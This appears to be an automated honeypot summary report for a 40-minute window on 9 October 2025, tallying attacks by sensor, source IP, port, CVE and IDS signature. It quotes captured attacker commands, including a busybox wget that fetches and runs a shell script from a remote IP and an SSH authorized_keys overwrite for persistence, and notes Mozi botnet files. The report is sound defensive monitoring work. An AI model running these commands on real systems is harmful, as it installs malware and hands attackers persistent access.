**Honeypot Attack Summary Report**

*   **Report Generation Time:** 2025-10-09T19:01:27Z
*   **Timeframe:** 2025-10-09T18:20:01Z to 2025-10-09T19:00:01Z
*   **Files:** `agg_log_20251009T182001Z.json`, `agg_log_20251009T184001Z.json`, `agg_log_20251009T190001Z.json`

**Executive Summary**

This report summarizes honeypot activity from three log files, spanning from 18:20 to 19:00 on October 9th, 2025. A total of 16,002 attacks were recorded. The most active honeypot was Cowrie, and the most frequent attacker IP was 167.250.224.25. The primary port targeted was 22 (SSH). Several CVEs were detected, with CVE-2021-3449, CVE-2019-11500, and CVE-2002-0013/CVE-2002-0012 being the most common. Attackers frequently attempted to manipulate SSH authorized_keys files and download malicious shell scripts.

**Detailed Analysis**

*   **Attacks by honeypot:**
    *   Cowrie: 6672
    *   Honeytrap: 3524
    *   Suricata: 2713
    *   Ciscoasa: 1630
    *   Sentrypeer: 371
    *   Heralding: 301
    *   Dionaea: 247
    *   Adbhoney: 138
    *   Tanner: 148
    *   Mailoney: 92
    *   H0neytr4p: 61
    *   ElasticPot: 46
    *   Redishoneypot: 24
    *   Honeyaml: 16
    *   ConPot: 11
    *   Miniprint: 3
    *   Dicompot: 3
    *   Ipphoney: 2

*   **Top attacking IPs:**
    *   167.250.224.25: 1956
    *   71.168.162.91: 1096
    *   212.87.220.20: 971
    *   80.94.95.238: 684
    *   88.214.50.58: 569
    *   172.31.36.128: 304
    *   80.239.178.98: 301
    *   211.219.22.213: 263
    *   45.78.192.214: 217
    *   202.8.127.134: 283
    *   14.224.227.189: 176
    *   124.158.184.101: 170
    *   88.210.63.16: 252
    *   198.12.123.22: 184
    *   24.199.100.234: 134
    *   185.91.69.33: 122
    *   222.124.17.227: 99
    *   185.81.152.174: 99
    *   183.131.109.159: 90
    *   159.89.121.144: 109

*   **Top targeted ports/protocols:**
    *   22: 1189
    *   5060: 371
    *   vnc/5900: 301
    *   5903: 211
    *   3306: 197
    *   80: 139
    *   5908: 83
    *   5909: 83
    *   5901: 74
    *   25: 92
    *   5555: 62
    *   9200: 38
    *   9001: 38
    *   23: 45
    *   5907: 49
    *   443: 43
    *   1050: 39

*   **Most common CVEs:**
    *   CVE-2002-0013 CVE-2002-0012: 9
    *   CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 7
    *   CVE-2019-11500 CVE-2019-11500: 4
    *   CVE-2021-3449 CVE-2021-3449: 3
    *   CVE-2005-4050: 2
    *   CVE-2006-2369: 1

*   **Commands attempted by attackers:**
    *   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
    *   `lockr -ia .ssh`
    *   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
    *   `cat /proc/cpuinfo | grep name | wc -l`
    *   `Enter new UNIX password:`
    *   `uname -s -v -n -r -m`
    *   `cd /data/local/tmp/; busybox wget http://82.29.197.139/w.sh; sh w.sh; ...`
    *   `tftp; wget; /bin/busybox KJFXS`
    *   Standard system enumeration commands (`uname -a`, `whoami`, `w`, `crontab -l`, etc.)

*   **Signatures triggered:**
    *   ET SCAN MS Terminal Server Traffic on Non-standard Port
    *   ET INFO VNC Authentication Failure
    *   ET HUNTING RDP Authentication Bypass Attempt
    *   ET DROP Dshield Block Listed Source group 1
    *   ET SCAN NMAP -sS window 1024

*   **Users / login attempts:**
    *   root/: 180
    *   Numerous attempts with root and common service names with password variations (e.g., `Iss@bi12025`, `supervisor6`, `ubnt5`).

*   **Files uploaded/downloaded:**
    *   wget.sh
    *   w.sh
    *   c.sh
    *   Mozi.a+jaws
    *   Various web assets (css, js files)

*   **HTTP User-Agents:** (None recorded in these logs)

*   **SSH clients and servers:** (None recorded in these logs)

*   **Top attacker AS organizations:** (None recorded in these logs)

**Key Observations and Anomalies**

*   A significant amount of automated activity is focused on compromising SSH servers, with attackers attempting to add their own SSH keys to the `authorized_keys` file.
*   The commands executed suggest an attempt to download and execute malicious payloads from a remote server (82.29.197.139).
*   The presence of `Mozi.a+jaws` in downloaded files indicates activity from the Mozi botnet.
*   The high volume of VNC and RDP related signatures suggests that attackers are actively scanning for and attempting to exploit remote desktop services.
